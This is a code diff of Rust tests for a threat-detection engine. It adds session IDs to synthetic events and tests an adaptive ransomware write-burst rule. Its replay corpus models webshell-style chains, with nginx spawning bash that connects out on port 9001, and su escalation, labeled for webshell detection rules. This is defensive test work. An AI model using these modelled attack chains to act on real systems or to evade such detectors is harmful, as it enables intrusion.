+    adaptive_policy.adaptive_min_samples = 1;
+    adaptive_policy.adaptive_floor = 8;
+    adaptive_policy.adaptive_delta = 0.5;
+    let mut l4_adaptive = Layer4Engine::with_capacity_and_policy(
+        300,
+        8_192,
+        32_768,
+        adaptive_policy,
+    );
+    l4_adaptive.add_template(KillChainTemplate {
+        name: "killchain_ransomware_write_burst".to_string(),
+        stages: vec![TemplatePredicate {
+            process_any_of: None,
+            uid_eq: None,
+            uid_ne: None,
+            require_network_non_web: false,
+            require_module_loaded: false,
+            require_sensitive_file_access: false,
+            require_ransomware_write_burst: true,
+        }],
+        max_depth: 2,
+        max_inter_stage_secs: 15,
+    });
+
+    for i in 0..10 {
+        let mut ev = event(1000 + i, EventClass::FileOpen, "python", "systemd", 1000);
+        ev.pid = 9300;
+        ev.ppid = 1;
+        ev.session_id = ev.pid;
+        ev.file_path = Some("/home/user/docs/note.txt".to_string());
+        ev.file_write = true;
+        let _ = l4_adaptive.observe(&ev);
+    }
+
+    for i in 0..5 {
+        let mut ev = event(3000 + i, EventClass::FileOpen, "python", "systemd", 1000);
+        ev.pid = 9300;
+        ev.ppid = 1;
+        ev.session_id = ev.pid;
+        ev.file_path = Some("/data/projects/alpha/report.docx".to_string());
+        ev.file_write = true;
+        let _ = l4_adaptive.observe(&ev);
+    }
+
+    let mut ev = event(3050, EventClass::FileOpen, "python", "systemd", 1000);
+    ev.pid = 9300;
+    ev.ppid = 1;
+    ev.session_id = ev.pid;
+    ev.file_path = Some("/data/projects/alpha/report.docx".to_string());
+    ev.file_write = true;
+    let _ = l4_adaptive.observe(&ev);
+
+    let mut triggered_learned = false;
+    for i in 0..15 {
+        let mut ev = event(3070 + i, EventClass::FileOpen, "python", "systemd", 1000);
+        ev.pid = 9300;
+        ev.ppid = 1;
+        ev.session_id = ev.pid;
+        ev.file_path = Some("/data/projects/beta/output.bin".to_string());
+        ev.file_write = true;
+        let hits = l4_adaptive.observe(&ev);
+        if hits.iter().any(|h| h == "killchain_ransomware_write_burst") {
+            triggered_learned = true;
+            break;
+        }
+    }
+
+    assert!(
+        triggered_learned,
+        "learned roots should allow non-default user paths"
+    );
 }
 
 #[test]
@@ -939,6 +1274,7 @@ fn detection_outcome_includes_rule_names_and_matched_fields_for_traceability() {
     let mut first = event(1, EventClass::ProcessExec, "bash", "nginx", 1000);
     first.pid = 700;
     first.file_hash = Some("deadbeef".to_string());
+    first.session_id = first.pid;
     let first_out = engine.process_event(&first);
     assert!(first_out
         .layer1
@@ -948,6 +1284,7 @@ fn detection_outcome_includes_rule_names_and_matched_fields_for_traceability() {
 
     let mut second = event(2, EventClass::NetworkConnect, "bash", "nginx", 1000);
     second.pid = 700;
+    second.session_id = second.pid;
     second.dst_port = Some(9001);
     let second_out = engine.process_event(&second);
     assert!(second_out.temporal_hits.iter().any(|h| h == "phi_webshell"));
@@ -977,10 +1314,12 @@ detection:
 
     let mut e1 = event(10, EventClass::ProcessExec, "bash", "nginx", 33);
     e1.pid = 404;
+    e1.session_id = e1.pid;
     assert!(t.observe(&e1).is_empty());
 
     let mut e2 = event(15, EventClass::NetworkConnect, "bash", "nginx", 33);
     e2.pid = 404;
+    e2.session_id = e2.pid;
     e2.dst_port = Some(8443);
     let hits = t.observe(&e2);
     assert!(hits.iter().any(|v| v == "sigma_webshell_network"));
@@ -1432,6 +1771,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
     for i in 0..30i64 {
         let mut ev = event(i, EventClass::ProcessExec, "bash", "sshd", 1000);
         ev.pid = 10_000 + i as u32;
+        ev.session_id = ev.pid;
 
         if i % 10 == 0 {
             ev.file_hash = Some("deadbeef".to_string());
@@ -1448,19 +1788,23 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
 
         let mut stage1 = event(base, EventClass::ProcessExec, "bash", "sshd", 1000);
         stage1.pid = pid;
+        stage1.session_id = stage1.pid;
         corpus.push(labeled_event(stage1, None));
 
         let mut stage2 = event(base + 5, EventClass::ProcessExec, "su", "bash", 0);
         stage2.pid = pid;
+        stage2.session_id = stage2.pid;
         corpus.push(labeled_event(stage2, Some(Confidence::High)));
 
         let miss_pid = 21_000 + seq as u32;
         let mut miss_stage1 = event(base + 10, EventClass::ProcessExec, "bash", "sshd", 1000);
         miss_stage1.pid = miss_pid;
+        miss_stage1.session_id = miss_stage1.pid;
         corpus.push(labeled_event(miss_stage1, None));
 
         let mut miss_stage2 = event(base + 35, EventClass::ProcessExec, "su", "bash", 0);
         miss_stage2.pid = miss_pid;
+        miss_stage2.session_id = miss_stage2.pid;
         corpus.push(labeled_event(miss_stage2, None));
     }
 
@@ -1473,16 +1817,19 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut parent = event(base, EventClass::ProcessExec, "nginx", "systemd", 33);
         parent.pid = parent_pid;
         parent.ppid = 1;
+        parent.session_id = parent.pid;
         corpus.push(labeled_event(parent, None));
 
         let mut child = event(base + 2, EventClass::ProcessExec, "bash", "nginx", 33);
         child.pid = child_pid;
         child.ppid = parent_pid;
+        child.session_id = child.pid;
         corpus.push(labeled_event(child, None));
 
         let mut net = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 33);
         net.pid = child_pid;
         net.ppid = parent_pid;
+        net.session_id = net.pid;
         net.dst_port = Some(9001);
         corpus.push(labeled_event(net, Some(Confidence::VeryHigh)));
 
@@ -1492,16 +1839,19 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut benign_parent = event(base + 20, EventClass::ProcessExec, "nginx", "systemd", 33);
         benign_parent.pid = benign_parent_pid;
         benign_parent.ppid = 1;
+        benign_parent.session_id = benign_parent.pid;
         corpus.push(labeled_event(benign_parent, None));
 
         let mut benign_child = event(base + 22, EventClass::ProcessExec, "bash", "nginx", 33);
         benign_child.pid = benign_child_pid;
         benign_child.ppid = benign_parent_pid;
+        benign_child.session_id = benign_child.pid;
         corpus.push(labeled_event(benign_child, None));
 
         let mut benign_net = event(base + 25, EventClass::NetworkConnect, "bash", "nginx", 33);
         benign_net.pid = benign_child_pid;
         benign_net.ppid = benign_parent_pid;
+        benign_net.session_id = benign_net.pid;
         benign_net.dst_port = Some(443);
         corpus.push(labeled_event(benign_net, None));
     }
@@ -1517,6 +1867,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
 
         let mut ev = event(3_000 + i, class, "agentd", "systemd", 1000);
         ev.pid = 40_000 + i as u32;
+        ev.session_id = ev.pid;
 
         match class {
             EventClass::FileOpen => {
@@ -1547,27 +1898,32 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut parent = event(base, EventClass::ProcessExec, "nginx", "systemd", 33);
         parent.pid = parent_pid;
         parent.ppid = 1;
+        parent.session_id = parent.pid;
         corpus.push(labeled_event(parent, None));
 
         let mut child = event(base + 2, EventClass::ProcessExec, "bash", "nginx", 33);
         child.pid = child_pid;
         child.ppid = parent_pid;
+        child.session_id = child.pid;
         corpus.push(labeled_event(child, None));
 
         let mut malicious_net = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 33);
         malicious_net.pid = child_pid;
         malicious_net.ppid = parent_pid;
+        malicious_net.session_id = malicious_net.pid;
         malicious_net.dst_port = Some(9001);
         corpus.push(labeled_event(malicious_net, Some(Confidence::VeryHigh)));
 
         let mut reused_pid_exec = event(base + 20, EventClass::ProcessExec, "bash", "nginx", 33);
         reused_pid_exec.pid = child_pid;
         reused_pid_exec.ppid = parent_pid;
+        reused_pid_exec.session_id = reused_pid_exec.pid;
         corpus.push(labeled_event(reused_pid_exec, None));
 
         let mut benign_net = event(base + 22, EventClass::NetworkConnect, "bash", "nginx", 33);
         benign_net.pid = child_pid;
         benign_net.ppid = parent_pid;
+        benign_net.session_id = benign_net.pid;
         benign_net.dst_port = Some(443);
         corpus.push(labeled_event(benign_net, None));
     }
@@ -1580,11 +1936,13 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut stale_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
         stale_stage1.pid = pid;
         stale_stage1.ppid = 1;
+        stale_stage1.session_id = stale_stage1.pid;
         corpus.push(labeled_event(stale_stage1, None));
 
         let mut reused_exec = event(base + 3, EventClass::ProcessExec, "python", "systemd", 1000);
         reused_exec.pid = pid;
         reused_exec.ppid = 1;
+        reused_exec.session_id = reused_exec.pid;
         corpus.push(labeled_event(reused_exec, None));
 
         let mut stale_followup = event(
@@ -1596,6 +1954,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         );
         stale_followup.pid = pid;
         stale_followup.ppid = 1;
+        stale_followup.session_id = stale_followup.pid;
         stale_followup.dst_port = Some(9001);
         corpus.push(labeled_event(stale_followup, None));
     }
@@ -1608,27 +1967,32 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut first_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
         first_stage1.pid = pid;
         first_stage1.ppid = 1;
+        first_stage1.session_id = first_stage1.pid;
         corpus.push(labeled_event(first_stage1, None));
 
         let mut skewed_restart = event(base - 50, EventClass::ProcessExec, "bash", "nginx", 33);
         skewed_restart.pid = pid;
         skewed_restart.ppid = 1;
+        skewed_restart.session_id = skewed_restart.pid;
         corpus.push(labeled_event(skewed_restart, None));
 
         let mut skewed_followup = event(base - 45, EventClass::NetworkConnect, "bash", "nginx", 33);
         skewed_followup.pid = pid;
         skewed_followup.ppid = 1;
+        skewed_followup.session_id = skewed_followup.pid;
         skewed_followup.dst_port = Some(9001);
         corpus.push(labeled_event(skewed_followup, None));
 
         let mut fresh_stage1 = event(base + 5, EventClass::ProcessExec, "bash", "nginx", 33);
         fresh_stage1.pid = pid;
         fresh_stage1.ppid = 1;
+        fresh_stage1.session_id = fresh_stage1.pid;
         corpus.push(labeled_event(fresh_stage1, None));
 
         let mut fresh_stage2 = event(base + 8, EventClass::NetworkConnect, "bash", "nginx", 33);
         fresh_stage2.pid = pid;
         fresh_stage2.ppid = 1;
+        fresh_stage2.session_id = fresh_stage2.pid;
         fresh_stage2.dst_port = Some(9001);
         corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
     }
@@ -1641,6 +2005,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut stale_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
         stale_stage1.pid = pid;
         stale_stage1.ppid = 1;
+        stale_stage1.session_id = stale_stage1.pid;
         corpus.push(labeled_event(stale_stage1, None));
 
         let mut identity_drift_followup = event(
@@ -1652,17 +2017,20 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         );
         identity_drift_followup.pid = pid;
         identity_drift_followup.ppid = 1;
+        identity_drift_followup.session_id = identity_drift_followup.pid;
         identity_drift_followup.dst_port = Some(9001);
         corpus.push(labeled_event(identity_drift_followup, None));
 
         let mut fresh_stage1 = event(base + 8, EventClass::ProcessExec, "bash", "nginx", 33);
         fresh_stage1.pid = pid;
         fresh_stage1.ppid = 1;
+        fresh_stage1.session_id = fresh_stage1.pid;
         corpus.push(labeled_event(fresh_stage1, None));
 
         let mut fresh_stage2 = event(base + 11, EventClass::NetworkConnect, "bash", "nginx", 33);
         fresh_stage2.pid = pid;
         fresh_stage2.ppid = 1;
+        fresh_stage2.session_id = fresh_stage2.pid;
         fresh_stage2.dst_port = Some(9001);
         corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
     }
@@ -1675,29 +2043,34 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut stale_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
         stale_stage1.pid = pid;
         stale_stage1.ppid = 1;
+        stale_stage1.session_id = stale_stage1.pid;
         corpus.push(labeled_event(stale_stage1, None));
 
         let mut horizon_advance =
             event(base + 500, EventClass::FileOpen, "python", "systemd", 1000);
         horizon_advance.pid = pid + 1;
         horizon_advance.ppid = 1;
+        horizon_advance.session_id = horizon_advance.pid;
         horizon_advance.file_path = Some("/tmp/harmless.log".to_string());
         corpus.push(labeled_event(horizon_advance, None));
 
         let mut stale_followup = event(base + 505, EventClass::NetworkConnect, "bash", "nginx", 33);
         stale_followup.pid = pid;
         stale_followup.ppid = 1;
+        stale_followup.session_id = stale_followup.pid;
         stale_followup.dst_port = Some(9001);
         corpus.push(labeled_event(stale_followup, None));
 
         let mut fresh_stage1 = event(base + 510, EventClass::ProcessExec, "bash", "nginx", 33);
         fresh_stage1.pid = pid;
         fresh_stage1.ppid = 1;
+        fresh_stage1.session_id = fresh_stage1.pid;
         corpus.push(labeled_event(fresh_stage1, None));
 
         let mut fresh_stage2 = event(base + 513, EventClass::NetworkConnect, "bash", "nginx", 33);
         fresh_stage2.pid = pid;
         fresh_stage2.ppid = 1;
+        fresh_stage2.session_id = fresh_stage2.pid;
         fresh_stage2.dst_port = Some(9001);
         corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
     }
@@ -1711,18 +2084,21 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
             let mut tied_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 0);
             tied_stage1.pid = start_pid + offset;
             tied_stage1.ppid = 1;
+            tied_stage1.session_id = tied_stage1.pid;
             corpus.push(labeled_event(tied_stage1, None));
         }
 
         let mut evicted_followup = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 0);
         evicted_followup.pid = start_pid;
         evicted_followup.ppid = 1;
+        evicted_followup.session_id = evicted_followup.pid;
         evicted_followup.dst_port = Some(9001);
         corpus.push(labeled_event(evicted_followup, None));
 
         let mut retained_followup = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 0);
         retained_followup.pid = start_pid + 219;
         retained_followup.ppid = 1;
+        retained_followup.session_id = retained_followup.pid;
         retained_followup.dst_port = Some(9001);
         corpus.push(labeled_event(retained_followup, Some(Confidence::High)));
     }
@@ -1735,34 +2111,40 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut victim_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 0);
         victim_stage1.pid = victim_pid;
         victim_stage1.ppid = 1;
+        victim_stage1.session_id = victim_stage1.pid;
         corpus.push(labeled_event(victim_stage1, None));
 
         for offset in 0..220u32 {
             let mut pressure_stage1 = event(base + 1, EventClass::ProcessExec, "bash", "nginx", 0);
             pressure_stage1.pid = victim_pid + 10 + offset;
             pressure_stage1.ppid = 1;
+            pressure_stage1.session_id = pressure_stage1.pid;
             corpus.push(labeled_event(pressure_stage1, None));
         }
 
         let mut skewed_restart = event(base - 20, EventClass::ProcessExec, "bash", "nginx", 0);
         skewed_restart.pid = victim_pid;
         skewed_restart.ppid = 1;
+        skewed_restart.session_id = skewed_restart.pid;
         corpus.push(labeled_event(skewed_restart, None));
 
         let mut skewed_followup = event(base - 15, EventClass::NetworkConnect, "bash", "nginx", 0);
         skewed_followup.pid = victim_pid;
         skewed_followup.ppid = 1;
+        skewed_followup.session_id = skewed_followup.pid;
         skewed_followup.dst_port = Some(9001);
         corpus.push(labeled_event(skewed_followup, None));
 
         let mut fresh_stage1 = event(base + 10, EventClass::ProcessExec, "bash", "nginx", 0);
         fresh_stage1.pid = victim_pid;
         fresh_stage1.ppid = 1;
+        fresh_stage1.session_id = fresh_stage1.pid;
         corpus.push(labeled_event(fresh_stage1, None));
 
         let mut fresh_stage2 = event(base + 13, EventClass::NetworkConnect, "bash", "nginx", 0);
         fresh_stage2.pid = victim_pid;
         fresh_stage2.ppid = 1;
+        fresh_stage2.session_id = fresh_stage2.pid;
         fresh_stage2.dst_port = Some(9001);
         corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
     }
@@ -1776,27 +2158,32 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut parent = event(base, EventClass::ProcessExec, "nginx", "systemd", 33);
         parent.pid = parent_pid;
         parent.ppid = 1;
+        parent.session_id = parent.pid;
         corpus.push(labeled_event(parent, None));
 
         let mut child = event(base + 2, EventClass::ProcessExec, "bash", "nginx", 33);
         child.pid = child_pid;
         child.ppid = parent_pid;
+        child.session_id = child.pid;
         corpus.push(labeled_event(child, None));
 
         let mut malicious_net = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 33);
         malicious_net.pid = child_pid;
         malicious_net.ppid = parent_pid;
+        malicious_net.session_id = malicious_net.pid;
         malicious_net.dst_port = Some(9001);
         corpus.push(labeled_event(malicious_net, Some(Confidence::VeryHigh)));
 
         let mut exit = event(base + 6, EventClass::ProcessExit, "bash", "nginx", 33);
         exit.pid = child_pid;
         exit.ppid = parent_pid;
+        exit.session_id = exit.pid;
         corpus.push(labeled_event(exit, None));
 
         let mut reused_exec = event(base + 8, EventClass::ProcessExec, "python", "systemd", 1000);
         reused_exec.pid = child_pid;
         reused_exec.ppid = 1;
+        reused_exec.session_id = reused_exec.pid;
         corpus.push(labeled_event(reused_exec, None));
 
         let mut stale_net = event(
@@ -1808,6 +2195,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         );
         stale_net.pid = child_pid;
         stale_net.ppid = 1;
+        stale_net.session_id = stale_net.pid;
         stale_net.dst_port = Some(9001);
         corpus.push(labeled_event(stale_net, None));
 
@@ -1815,16 +2203,19 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         let mut fresh_parent = event(base + 12, EventClass::ProcessExec, "nginx", "systemd", 33);
         fresh_parent.pid = fresh_parent_pid;
         fresh_parent.ppid = 1;
+        fresh_parent.session_id = fresh_parent.pid;
         corpus.push(labeled_event(fresh_parent, None));
 
         let mut fresh_child = event(base + 13, EventClass::ProcessExec, "bash", "nginx", 33);
         fresh_child.pid = child_pid;
         fresh_child.ppid = fresh_parent_pid;
+        fresh_child.session_id = fresh_child.pid;
         corpus.push(labeled_event(fresh_child, None));
 
         let mut fresh_net = event(base + 16, EventClass::NetworkConnect, "bash", "nginx", 33);
         fresh_net.pid = child_pid;
         fresh_net.ppid = fresh_parent_pid;
+        fresh_net.session_id = fresh_net.pid;
         fresh_net.dst_port = Some(9001);
         corpus.push(labeled_event(fresh_net, Some(Confidence::VeryHigh)));
     }
